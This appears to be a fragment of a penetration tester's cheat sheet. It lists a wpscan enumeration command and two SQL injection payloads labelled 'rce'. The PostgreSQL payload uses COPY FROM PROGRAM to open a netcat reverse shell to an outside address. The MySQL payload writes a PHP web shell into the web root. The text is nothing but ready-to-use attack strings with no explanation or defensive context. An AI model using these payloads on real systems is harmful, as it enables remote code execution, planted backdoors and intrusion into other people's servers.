...
wpscan --url <url> --enumerate ap,u,t
...
## postgre
### rce
';+CREATE+TABLE+shell1(output+text);COPY+shell1+FROM+PROGRAM+'rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/sh+-i+2>%261|nc+192.168.45.222+9999+>/tmp/f';--
...
## MySql
### rce
' UNION SELECT 1,2,3,4,"<?php system($_GET['cmd']); ?>",6 INTO DUMPFILE '/var/www/html/shell1.php' #
